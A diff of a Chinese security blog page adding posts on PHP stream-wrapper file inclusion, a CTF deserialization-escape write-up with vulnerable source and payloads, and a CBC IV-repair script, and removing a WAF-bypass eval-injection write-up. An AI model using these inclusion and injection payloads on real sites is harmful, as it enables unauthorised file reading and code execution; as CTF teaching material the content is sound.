@@ -169,6 +169,226 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-伪协议" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+        伪协议
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="我们在ctf中可能遇到的包含函数"><a href="#我们在ctf中可能遇到的包含函数" class="headerlink" title="我们在ctf中可能遇到的包含函数"></a>我们在ctf中可能遇到的包含函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include( )</span><br><span class="line">require( )</span><br><span class="line">include_once( )</span><br><span class="line">require_once( )</span><br><span class="line">highlight_file( )</span><br><span class="line">show_source( )</span><br><span class="line">readfile( )</span><br><span class="line">file_get_contents( )</span><br><span class="line">fopen( )</span><br><span class="line">file( )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>PHP伪协议其实就是支持的协议和封装协议，有12种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// ——访问本地文件</span><br><span class="line">http://——访问HTTP(s)网址</span><br><span class="line">ftp://——访问FTP(s)URLs</span><br><span class="line">php://——访问各个输入或输出流（I/O streams）</span><br><span class="line">zlib://——压缩流</span><br><span class="line">data://——数据(RFC2397)</span><br><span class="line">glob://——查找匹配的文件路径模式</span><br><span class="line">phar://——PHP归档</span><br><span class="line">ssh2://——Secure Shell2</span><br><span class="line">rar://——RAR</span><br><span class="line">ogg://——音频流</span><br><span class="line">expect://——处理交互的流</span><br></pre></td></tr></table></figure>
+
+<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>file://用于读取本地文件，不受allow_url_fopen和allow_url_include影响</p>
+<h3 id="file-文件的绝对路径和文件名"><a href="#file-文件的绝对路径和文件名" class="headerlink" title="file://[文件的绝对路径和文件名]"></a>file://[文件的绝对路径和文件名]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?file=file://D:/soft/xiaocheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="文件的相对路径和文件名"><a href="#文件的相对路径和文件名" class="headerlink" title="[文件的相对路径和文件名]"></a>[文件的相对路径和文件名]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?file=./xioacheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="http-网络路径和文件名"><a href="#http-网络路径和文件名" class="headerlink" title="http://网络路径和文件名"></a>http://网络路径和文件名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xioacheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="php-用于访问各个输入-输出流（I-O-streams-，不受allow-url-fopen影响"><a href="#php-用于访问各个输入-输出流（I-O-streams-，不受allow-url-fopen影响" class="headerlink" title="php://用于访问各个输入/输出流（I/O streams)，不受allow_url_fopen影响"></a>php://用于访问各个输入/输出流（I/O streams)，不受allow_url_fopen影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter 用于读取源码</span><br><span class="line">php://input 用于执行php代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用上面两种格式的php伪协议格式时，需要allow_url_include是on</p>
+<h3 id="常用php-filter读取文件源码的格式（针对php文件需要base64编码）："><a href="#常用php-filter读取文件源码的格式（针对php文件需要base64编码）：" class="headerlink" title="常用php://filter读取文件源码的格式（针对php文件需要base64编码）："></a>常用php://filter读取文件源码的格式（针对php文件需要base64编码）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=[文件名]（如果文件内容非php语法，则输出源码内容，如果是php语法，则执行php代码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="常用php-input执行php代码的格式（输入的php代码部分需要post提交）"><a href="#常用php-input执行php代码的格式（输入的php代码部分需要post提交）" class="headerlink" title="常用php://input执行php代码的格式（输入的php代码部分需要post提交）"></a>常用php://input执行php代码的格式（输入的php代码部分需要post提交）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input[POST DATA]&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="zip-协议-amp-bzaip2-协议-amp-zlib-协议"><a href="#zip-协议-amp-bzaip2-协议-amp-zlib-协议" class="headerlink" title="zip://协议&amp;bzaip2://协议&amp;zlib://协议"></a>zip://协议&amp;bzaip2://协议&amp;zlib://协议</h2><h3 id="zip-协议-amp-bzaip2-协议-amp-zlib-协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀"><a href="#zip-协议-amp-bzaip2-协议-amp-zlib-协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀" class="headerlink" title="zip://协议&amp;bzaip2://协议&amp;zlib://协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀"></a>zip://协议&amp;bzaip2://协议&amp;zlib://协议都属于压缩流，可以用来访问压缩文件中的子文件，而且不需要指定文件名后缀，可修改为任意后缀</h3><h4 id="zip-压缩文件的绝对路径-23-压缩文件内的子文件名-编码-23）"><a href="#zip-压缩文件的绝对路径-23-压缩文件内的子文件名-编码-23）" class="headerlink" title="zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名](#编码%23）"></a>zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名](#编码%23）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://D:\www\xiaocheng.zip%23cheng.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="compress-bzip2-file-bz2压缩xiaocheng-txt为xiaocheng-bz2并上传（同样支持任意后缀名）"><a href="#compress-bzip2-file-bz2压缩xiaocheng-txt为xiaocheng-bz2并上传（同样支持任意后缀名）" class="headerlink" title="compress.bzip2://file.bz2压缩xiaocheng.txt为xiaocheng.bz2并上传（同样支持任意后缀名）"></a>compress.bzip2://file.bz2压缩xiaocheng.txt为xiaocheng.bz2并上传（同样支持任意后缀名）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://D:\www\xioacheng.bz2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="compress-zlib-file-gz压缩xiaocheng-txt为xiaocheng-gz并上传（同样支持任意后缀名）"><a href="#compress-zlib-file-gz压缩xiaocheng-txt为xiaocheng-gz并上传（同样支持任意后缀名）" class="headerlink" title="compress.zlib://file.gz压缩xiaocheng.txt为xiaocheng.gz并上传（同样支持任意后缀名）"></a>compress.zlib://file.gz压缩xiaocheng.txt为xiaocheng.gz并上传（同样支持任意后缀名）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://D:\www\xiaocheng.gz</span><br></pre></td></tr></table></figure>
+
+<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://协议可以执行php代码，但是需要allow_url_include和allow_url_fopen是on的，也可以写入文本数据</p>
+<p>data://协议常用的格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>其它格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data://,&lt;文本数据&gt;</span><br><span class="line"></span><br><span class="line">data://text/plain,&lt;文本数据&gt;</span><br><span class="line"></span><br><span class="line">data://text/html,&lt;html代码&gt;</span><br><span class="line"></span><br><span class="line">data://text/css,&lt;CSS代码&gt;</span><br><span class="line"></span><br><span class="line">data://text/javascript,&lt;js代码&gt;</span><br><span class="line"></span><br><span class="line">data://text/gif;base24,&lt;base24编码的gif图片数据&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h2><p>phar://协议可以访问zip格式压缩包内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?file=phar://D:\www\xiaocheng.zip\xioacheng.txt</span><br></pre></td></tr></table></figure>
+
+<p>详细请看：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a><br>    <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2fce6931dd06">https://www.jianshu.com/p/2fce6931dd06</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-安洵杯2019serilaze" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E5%AE%89%E6%B4%B5%E6%9D%AF2019serilaze/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E5%AE%89%E6%B4%B5%E6%9D%AF2019serilaze/">
+        安洵杯2019serilaze
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯 2019]easy_serialize_php"></a>安洵杯 2019]easy_serialize_php</h1><p>代码审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125; #对$img里面的php,flag,php5,php4,fl1g进行过滤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125; #将已有的session删除掉</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function; #给名为user和function的session赋值</span><br><span class="line"></span><br><span class="line">extract($_POST); #用POST提交的方式叫html表单</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125; #如果没有img_path这个变量，则给guset_img.png加密，有，则给img_path加密</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION)); #将$_SESSION序列化的值给filter过滤</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125; #如果变量是highlight_file，则显示index.php</span><br><span class="line">else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125; #如果变量是phpinfo，则显示php信息</span><br><span class="line">else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;])); #如果变量是show_image，则显示$img变量里的文件里的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过观察php的信息，可以看到一个文件信息d0g3_flag.php</p>
+<p>但是我们无法读取这个文件的内容，然后通过代码审计，我们可以使用反序列化逃逸，通过改变img的值来读取</p>
+<p>可以通过exp来知道原来_SESSION序列化的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function=@$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;]=&#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;]=$function;</span><br><span class="line">$_SESSION[&#x27;img&#x27;]=base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">$serialize_info=serialize($_SESSION);</span><br><span class="line"></span><br><span class="line">echo $serialize_info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时输出的是：<br>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;N;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
+<p>我们可以通过减少关键词的数来逃逸<br>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
+<p>我们可以得到<br>$flag = ‘flag in /d0g3_fllllllag’;</p>
+<p>然后我们再改变一下img的数值<br>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p>
+<p>从而得到flag<br>flag{7b704900-c0d7-4302-90a6-fc459a2c405c} </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-对iv进行修复" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%E5%AF%B9iv%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%E5%AF%B9iv%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D/">
+        对iv进行修复
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="对iv进行修复"><a href="#对iv进行修复" class="headerlink" title="对iv进行修复"></a>对iv进行修复</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">cipher=&#x27; &#x27;  #提交后所得的无法反序列化密文</span><br><span class="line">iv=&#x27; &#x27;  #一开始提交的iv</span><br><span class="line">cipher=urllib.unquote(cipher)</span><br><span class="line">cipher=base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv=&#x27; &#x27;</span><br><span class="line">right=&#x27;a:2:&#123;s:8:&quot;userna&#x27;  #被损坏前的正确明文</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">	newIv+=chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))  #这一步相当于把原来iv不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-或运算绕过" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -716,250 +936,6 @@ echo serialize($a);
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-[RoarCTF 2019]Easy Calc(waf绕过和字符串特性及preg_match绕过）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%5BRoarCTF%202019%5DEasy%20Calc(waf%E7%BB%95%E8%BF%87%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7%E5%8F%8Apreg_match%E7%BB%95%E8%BF%87%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%5BRoarCTF%202019%5DEasy%20Calc(waf%E7%BB%95%E8%BF%87%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7%E5%8F%8Apreg_match%E7%BB%95%E8%BF%87%EF%BC%89/">
-        Easy Calc(waf绕过和字符串特性及preg_match绕过）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="php字符串特性及waf绕过"><a href="#php字符串特性及waf绕过" class="headerlink" title="php字符串特性及waf绕过"></a>php字符串特性及waf绕过</h1><h2 id="php字符串特性"><a href="#php字符串特性" class="headerlink" title="php字符串特性"></a>php字符串特性</h2><p>php在查询字符串时，会有两个特性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">删除空白格</span><br><span class="line"></span><br><span class="line">将某些字符转换为下划线</span><br></pre></td></tr></table></figure>
-
-<h2 id="waf的绕过"><a href="#waf的绕过" class="headerlink" title="waf的绕过"></a>waf的绕过</h2><p>如果一个waf对一个变量的内容进行了审计，则如果想绕过waf，可以在变量名前面加空格，这样waf就不会将其作为<br>它要审计的变量名，但前提是waf不是php写的，题目是php写的</p>
-<h2 id="scandir-函数"><a href="#scandir-函数" class="headerlink" title="scandir()函数"></a>scandir()函数</h2><p>scandir()函数返回指定目录的文件和目录的数组</p>
-<h2 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h2><p>var_dump()函数显示一个或多个表达式的结构信息，包括表达式的类型和数值</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过查看页面源代码，我们可以知道它有一个waf和一个文件calc.php</p>
-<p>我们通过构造/calc.php，得到源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>通过对源代码的审计，发现它对某些字符进行了过滤</p>
-<p>因此，由于可以利用php字符串的特性，在num前面加空格绕过waf，并构造payload来查看flag位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
-
-<p>可以看见里面有flagg文件，因此我们可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
-
-<p>可以得到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-[护网杯 2018]easy_tornado(ssti模板注入和tornado模板注入）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado(ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%92%8Ctornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado(ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%92%8Ctornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/">
-        easy_tornado(ssti模板注入和tornado模板注入）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ssti模板注入和tornado模板注入"><a href="#ssti模板注入和tornado模板注入" class="headerlink" title="ssti模板注入和tornado模板注入"></a>ssti模板注入和tornado模板注入</h1><h2 id="ssti模板和tornado模板注入"><a href="#ssti模板和tornado模板注入" class="headerlink" title="ssti模板和tornado模板注入"></a>ssti模板和tornado模板注入</h2><p>产生模板注入的原因：是因为没有对用户的输入进行相应的检查，过分相信用户的输入导致的，由于在ssti模板和tornado模板中存在render渲染函数和 template渲染函数，因此当用户输入信息时<br>                                render函数和 template函数对输入的信息进行执行，并将结果渲染回页面，此时用户的输入是可控的，而且也没有对输入的信息进行审计，导致可能会出现一些恶意的代码。</p>
-<h3 id="render函数和-template函数"><a href="#render函数和-template函数" class="headerlink" title="render函数和 template函数"></a>render函数和 template函数</h3><p>对里面的信息进行渲染和返回页面</p>
-<p>模板中可能的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render($_GET[&#x27;msg&#x27;])</span><br><span class="line"></span><br><span class="line">template($_GET[&#x27;msg&#x27;])</span><br></pre></td></tr></table></figure>
-<p>对输入的信息进行执行并渲染回页面</p>
